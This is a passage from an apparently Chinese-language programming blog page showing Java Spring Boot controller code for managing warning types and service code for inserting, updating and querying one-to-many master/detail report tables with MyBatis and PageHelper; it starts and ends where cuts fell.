class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.psds.credit.controller;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.github.pagehelper.PageInfo;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.common.core.controller.BaseController;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.entity.WarningType;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.framework.boot.message.CommonMessage;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.framework.boot.message.ResultData;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.model.WarningTypeAddBody;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.model.WarningTypeFindByKey;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.model.WarningTypeUpdBody;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.service.WarningTypeService;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.Api;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiOperation;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> javax.validation.Valid;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> ChenZhiMing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2022年1月19日, 0019</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Api(tags = &quot;预警类型管理&quot;)</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;warningType&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WarningTypeController</span> <span class="keyword">extends</span> <span class="title">BaseController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> WarningTypeService warningTypeService;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 新增预警类型</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> warningTypeAddBody:</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/addWarningType&quot;)</span></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;新增预警类型&quot;, notes = &quot;新增预警类型&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResultData&lt;Boolean&gt; <span class="title">addWarningType</span><span class="params">(<span class="meta">@RequestBody</span> <span class="meta">@Valid</span> WarningTypeAddBody warningTypeAddBody)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">&quot;新增预警类型,请求参数:&#123;&#125;&quot;</span>, JSONObject.toJSONString(warningTypeAddBody));</span><br><span class="line">        ResultData&lt;Boolean&gt; resultData = <span class="keyword">new</span> ResultData&lt;&gt;(CommonMessage.ERROR, <span class="string">&quot;操作失败&quot;</span>);</span><br><span class="line">        resultData.setData(<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            WarningType warningType = <span class="keyword">new</span> WarningType();</span><br><span class="line">            BeanUtils.copyProperties(warningTypeAddBody, warningType);</span><br><span class="line">            warningType.setCreateTime(<span class="keyword">new</span> Date());</span><br><span class="line">            warningType.setCreateUserName(getUsername());</span><br><span class="line">            warningType.setCreateUserId(Math.toIntExact(getUserId()));</span><br><span class="line">            <span class="keyword">boolean</span> bRtn = warningTypeService.addWarningType(warningType) &gt; <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (bRtn) &#123;</span><br><span class="line">                resultData.setCode(CommonMessage.SUCCESS);</span><br><span class="line">                resultData.setMsg(<span class="string">&quot;操作成功&quot;</span>);</span><br><span class="line">                resultData.setData(<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;新增预警类型出现异常:&#123;&#125;&quot;</span>, ex.getMessage(), ex);</span><br><span class="line">            resultData.setCode(CommonMessage.EXCEPTION);</span><br><span class="line">            resultData.setMsg(<span class="string">&quot;新增预警类型出现异常&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> resultData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 删除预警类型</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id:</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/delWarningType/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;删除预警类型&quot;, notes = &quot;根据id删除预警类型&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResultData&lt;Boolean&gt; <span class="title">delWarningType</span><span class="params">(<span class="meta">@PathVariable</span> Integer id)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">&quot;删除预警类型,请求参数:&#123;&#125;&quot;</span>, JSONObject.toJSONString(id));</span><br><span class="line">        ResultData&lt;Boolean&gt; resultData = <span class="keyword">new</span> ResultData&lt;&gt;(CommonMessage.ERROR, <span class="string">&quot;操作失败&quot;</span>);</span><br><span class="line">        resultData.setData(<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">boolean</span> bRtn = warningTypeService.delWarningType(id) &gt; <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (bRtn) &#123;</span><br><span class="line">                resultData.setCode(CommonMessage.SUCCESS);</span><br><span class="line">                resultData.setMsg(<span class="string">&quot;操作成功&quot;</span>);</span><br><span class="line">                resultData.setData(<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;删除预警类型出现异常:&#123;&#125;&quot;</span>, ex.getMessage(), ex);</span><br><span class="line">            resultData.setCode(CommonMessage.EXCEPTION);</span><br><span class="line">            resultData.setMsg(<span class="string">&quot;删除预警类型出现异常&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> resultData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 修改预警类型</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> warningTypeUpdBody:</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/updWarningType&quot;)</span></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;修改预警类型&quot;, notes = &quot;根据id修改预警类型&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResultData&lt;Boolean&gt; <span class="title">updateWarningType</span><span class="params">(<span class="meta">@RequestBody</span> <span class="meta">@Valid</span> WarningTypeUpdBody warningTypeUpdBody)</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">&quot;修改预警类型,请求参数:&#123;&#125;&quot;</span>, JSONObject.toJSONString(warningTypeUpdBody));</span><br><span class="line">        ResultData&lt;Boolean&gt; resultData = <span class="keyword">new</span> ResultData&lt;&gt;(CommonMessage.ERROR, <span class="string">&quot;操作失败&quot;</span>);</span><br><span class="line">        resultData.setData(<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            WarningType warningType = <span class="keyword">new</span> WarningType();</span><br><span class="line">            BeanUtils.copyProperties(warningTypeUpdBody, warningType);</span><br><span class="line">            warningType.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">            warningType.setUpdateUserName(getUsername());</span><br><span class="line">            warningType.setUpdateUserId(Math.toIntExact(getUserId()));</span><br><span class="line">            <span class="keyword">boolean</span> bRtn = warningTypeService.updateWarningType(warningType) &gt; <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (bRtn) &#123;</span><br><span class="line">                resultData.setCode(CommonMessage.SUCCESS);</span><br><span class="line">                resultData.setMsg(<span class="string">&quot;修改成功&quot;</span>);</span><br><span class="line">                resultData.setData(<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;修改预警类型出现异常:&#123;&#125;&quot;</span>, ex.getMessage(), ex);</span><br><span class="line">            resultData.setCode(CommonMessage.EXCEPTION);</span><br><span class="line">            resultData.setMsg(<span class="string">&quot;修改预警类型出现异常&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> resultData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据id查询预警类型</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id:</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/findWarningTypeById/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;根据id查询预警类型&quot;, notes = &quot;根据id查询预警类型&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResultData&lt;Optional&lt;WarningType&gt;&gt; findWarningTypeById(<span class="meta">@PathVariable</span> Integer id) &#123;</span><br><span class="line">        log.info(<span class="string">&quot;根据id查询预警类型,请求参数:&#123;&#125;&quot;</span>, JSONObject.toJSONString(id));</span><br><span class="line">        ResultData&lt;Optional&lt;WarningType&gt;&gt; resultData = <span class="keyword">new</span> ResultData&lt;&gt;(CommonMessage.ERROR, <span class="string">&quot;操作失败&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Optional&lt;WarningType&gt; warningTypeById = warningTypeService.findWarningTypeById(id);</span><br><span class="line">            <span class="keyword">if</span> (warningTypeById.isPresent()) &#123;</span><br><span class="line">                resultData.setCode(CommonMessage.SUCCESS);</span><br><span class="line">                resultData.setMsg(<span class="string">&quot;根据id查询预警类型成功&quot;</span>);</span><br><span class="line">                resultData.setData(warningTypeById);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                resultData.setCode(CommonMessage.ERROR);</span><br><span class="line">                resultData.setMsg(<span class="string">&quot;根据id查询预警类型为空&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;根据id查询预警类型出现异常:&#123;&#125;&quot;</span>, ex.getMessage(), ex);</span><br><span class="line">            resultData.setCode(CommonMessage.EXCEPTION);</span><br><span class="line">            resultData.setMsg(<span class="string">&quot;根据id查询预警类型出现异常&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> resultData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询所有预警类型</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> :</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/getWarningTypeList&quot;)</span></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;条件查询预警类型&quot;, notes = &quot;按条件查询预警类型,默认排序：主键&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResultData&lt;List&lt;WarningType&gt;&gt; getWarningTypeList(<span class="meta">@RequestBody</span> WarningTypeFindByKey baseRequest) &#123;</span><br><span class="line">        log.info(<span class="string">&quot;条件查询预警类型, 请求参数:&#123;&#125;&quot;</span>, JSONObject.toJSONString(baseRequest));</span><br><span class="line">        ResultData&lt;List&lt;WarningType&gt;&gt; resultData = <span class="keyword">new</span> ResultData&lt;&gt;(CommonMessage.ERROR, <span class="string">&quot;操作失败&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PageInfo&lt;WarningType&gt; pageInfo = warningTypeService.getWarningTypeList(baseRequest);</span><br><span class="line">            resultData.setCode(CommonMessage.SUCCESS);</span><br><span class="line">            resultData.setMsg(<span class="string">&quot;操作成功&quot;</span>);</span><br><span class="line">            resultData.setData(pageInfo.getList());</span><br><span class="line">            Map&lt;String, Object&gt; other = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            <span class="comment">//获取总记录数</span></span><br><span class="line">            other.put(<span class="string">&quot;total&quot;</span>, pageInfo.getTotal());</span><br><span class="line">            <span class="comment">//获取总页数</span></span><br><span class="line">            other.put(<span class="string">&quot;pages&quot;</span>, pageInfo.getPages());</span><br><span class="line">            resultData.setOther(other);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;条件查询预警类型出现异常:&#123;&#125;&quot;</span>, ex.getMessage(), ex);</span><br><span class="line">            resultData.setCode(CommonMessage.EXCEPTION);</span><br><span class="line">            resultData.setMsg(<span class="string">&quot;条件查询预警类型出现异常&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> resultData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h1 id="多表操作Service（一对多的主从表）"><a href="#多表操作Service（一对多的主从表）" class="headerlink" title="多表操作Service（一对多的主从表）"></a>多表操作Service（一对多的主从表）</h1><h2 id="新增"><a href="#新增" class="headerlink" title="新增"></a>新增</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional(rollbackFor = Exception.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">addTCustomReport</span><span class="params">(<span class="meta">@Valid</span> TCustomReportAdd customReportAdd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">        TCustomReport tCustomReport = <span class="keyword">new</span> TCustomReport();</span><br><span class="line">        BeanUtils.copyProperties(customReportAdd, tCustomReport);</span><br><span class="line">        tCustomReport.setReportCreateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        IJWTInfo jwtInfo = (IJWTInfo) request.getAttribute(<span class="string">&quot;JWTInfo&quot;</span>);</span><br><span class="line">        tCustomReport.setReportCreateUserId(jwtInfo.getId());</span><br><span class="line">        tCustomReport.setReportCreateUserName(jwtInfo.getUniqueName());</span><br><span class="line">        <span class="keyword">int</span> i = tCustomReportMapper.insertSelective(tCustomReport);</span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            List&lt;TCustomReportDetailAdd&gt; tCustomReportAddList = customReportAdd.getTCustomReportDetailAdds();</span><br><span class="line">            <span class="keyword">for</span> (TCustomReportDetailAdd tCustomReportDetailAdd : tCustomReportAddList) &#123;</span><br><span class="line">                TCustomReportDetail tCustomReportDetail = <span class="keyword">new</span> TCustomReportDetail();</span><br><span class="line">                BeanUtils.copyProperties(tCustomReportDetailAdd, tCustomReportDetail);</span><br><span class="line">                tCustomReportDetail.setReportId(tCustomReport.getReportId());</span><br><span class="line">                j = tCustomReportDetailMapper.insertSelective(tCustomReportDetail);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> j;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional(rollbackFor = Exception.class)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">updateTCustomReport</span><span class="params">(<span class="meta">@Valid</span> TCustomReportUpddBody tCustomReportUpdBody)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">       TCustomReport tCustomReport = <span class="keyword">new</span> TCustomReport();</span><br><span class="line">       BeanUtils.copyProperties(tCustomReportUpdBody, tCustomReport);</span><br><span class="line">       tCustomReport.setReportUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">       IJWTInfo jwtInfo = (IJWTInfo) request.getAttribute(<span class="string">&quot;JWTInfo&quot;</span>);</span><br><span class="line">       tCustomReport.setReportUpdateUserId(jwtInfo.getId());</span><br><span class="line">       tCustomReport.setReportUpdateUserName(jwtInfo.getUniqueName());</span><br><span class="line">       <span class="keyword">int</span> i = tCustomReportMapper.updateByPrimaryKeySelective(tCustomReport);</span><br><span class="line">       <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="comment">//先根据主表id删除子数据</span></span><br><span class="line">           Example exampleDel = <span class="keyword">new</span> Example(TCustomReportDetail.class);</span><br><span class="line">           exampleDel.createCriteria().andEqualTo(<span class="string">&quot;reportId&quot;</span>,tCustomReportUpdBody.getReportId());</span><br><span class="line">           tCustomReportDetailMapper.deleteByExample(exampleDel);</span><br><span class="line">           <span class="comment">//插入要修改的数据</span></span><br><span class="line">           List&lt;TCustomReportDetailAdd&gt; tCustomReportUpdList = tCustomReportUpdBody.getTCustomReportDetailUpd();</span><br><span class="line">           <span class="keyword">for</span> (TCustomReportDetailAdd tCustomReportDetailUpd : tCustomReportUpdList) &#123;</span><br><span class="line">               TCustomReportDetail tCustomReportDetail = <span class="keyword">new</span> TCustomReportDetail();</span><br><span class="line">               BeanUtils.copyProperties(tCustomReportDetailUpd, tCustomReportDetail);</span><br><span class="line">               tCustomReportDetail.setReportId(tCustomReportUpdBody.getReportId());</span><br><span class="line">               j = tCustomReportDetailMapper.insertSelective(tCustomReportDetail);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> j;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="根据id查询"><a href="#根据id查询" class="headerlink" title="根据id查询"></a>根据id查询</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TCustomReportFindByIdBody <span class="title">findTCustomReportById</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">       TCustomReport tCustomReport = tCustomReportMapper.selectByPrimaryKey(id);</span><br><span class="line">       TCustomReportFindByIdBody tCustomReportFindByIdBody = <span class="keyword">new</span> TCustomReportFindByIdBody();</span><br><span class="line">       <span class="keyword">if</span> (tCustomReport != <span class="keyword">null</span>) &#123;</span><br><span class="line">           BeanUtils.copyProperties(tCustomReport, tCustomReportFindByIdBody);</span><br><span class="line">           Example example = <span class="keyword">new</span> Example(TCustomReportDetail.class);</span><br><span class="line">           example.createCriteria().andEqualTo(<span class="string">&quot;reportId&quot;</span>, tCustomReport.getReportId());</span><br><span class="line">           List&lt;TCustomReportDetail&gt; tCustomReportDetails = tCustomReportDetailMapper.selectByExample(example);</span><br><span class="line">           tCustomReportFindByIdBody.setTCustomReportDetail(tCustomReportDetails);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> tCustomReportFindByIdBody;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="模糊查询并分页"><a href="#模糊查询并分页" class="headerlink" title="模糊查询并分页"></a>模糊查询并分页</h2><p>​        先查询主表，再新建一个与主表一样大小的用于分页的model（包含主从表所需的属性）列表，实例化这个列表，将主表的信息拷贝进model，在将从表的信息拷贝进model。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> PageInfo&lt;TCustomReportFindByIdBody&gt; <span class="title">getTCustomReportList</span><span class="params">(TCustomReportFindByKey req)</span> </span>&#123;</span><br><span class="line">    Example example = <span class="keyword">new</span> Example(TCustomReport.class);</span><br><span class="line">    Example.Criteria criteria = example.createCriteria();</span><br><span class="line">    <span class="keyword">if</span> (req.getReportStatus() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        criteria.andLike(<span class="string">&quot;reportStatus&quot;</span>, <span class="string">&quot;%&quot;</span> + req.getReportStatus() + <span class="string">&quot;%&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isNotBlank(req.getReportName())) &#123;</span><br><span class="line">        criteria.andLike(<span class="string">&quot;reportName&quot;</span>, <span class="string">&quot;%&quot;</span> + req.getReportName() + <span class="string">&quot;%&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isNotBlank(req.getReportCode())) &#123;</span><br><span class="line">        criteria.andLike(<span class="string">&quot;reportCode&quot;</span>, <span class="string">&quot;%&quot;</span> + req.getReportCode() + <span class="string">&quot;%&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isNotBlank(req.getReportUserName())) &#123;</span><br><span class="line">        criteria.andLike(<span class="string">&quot;reportUserName&quot;</span>, <span class="string">&quot;%&quot;</span> + req.getReportUserName() + <span class="string">&quot;%&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isNotBlank(req.getReportUserId())) &#123;</span><br><span class="line">        criteria.andLike(<span class="string">&quot;reportUserId&quot;</span>, <span class="string">&quot;%&quot;</span> + req.getReportUserId() + <span class="string">&quot;%&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isNotBlank(req.getOrderField())) &#123;</span><br><span class="line">        <span class="comment">//用户自定义排序</span></span><br><span class="line">        Example.OrderBy orderBy = example.orderBy(req.getOrderField());</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isNotBlank(req.getOrderSort())) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;asc&quot;</span>.equals(req.getOrderSort())) &#123;</span><br><span class="line">                orderBy.asc();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                orderBy.desc();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//设置默认排序</span></span><br><span class="line">        example.orderBy(<span class="string">&quot;reportId&quot;</span>).desc();</span><br><span class="line">    &#125;</span><br><span class="line">    PageHelper.startPage(req.getPageNo(), req.getPageSize());</span><br><span class="line">    List&lt;TCustomReport&gt; dataList = tCustomReportMapper.selectByExample(example);</span><br><span class="line">    PageInfo&lt;TCustomReport&gt; pageInfoTCustomReport = <span class="keyword">new</span> PageInfo&lt;&gt;(dataList);</span><br><span class="line">    <span class="comment">//创建和主表List一样长度的主从表List</span></span><br><span class="line">    List&lt;TCustomReportFindByIdBody&gt; tCustomReportFindByIdBody = Arrays.asList(<span class="keyword">new</span> TCustomReportFindByIdBody[dataList.size()]);</span><br><span class="line">    <span class="comment">//返回分页主从表</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dataList.size(); i++) &#123;</span><br><span class="line">        <span class="comment">//实例化list</span></span><br><span class="line">        tCustomReportFindByIdBody.set(i,<span class="keyword">new</span> TCustomReportFindByIdBody());</span><br><span class="line">        <span class="keyword">if</span> (dataList.get(i) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            BeanUtils.copyProperties(dataList.get(i), tCustomReportFindByIdBody.get(i));</span><br><span class="line">            Example exampleDetail = <span class="keyword">new</span> Example(TCustomReportDetail.class);</span><br><span 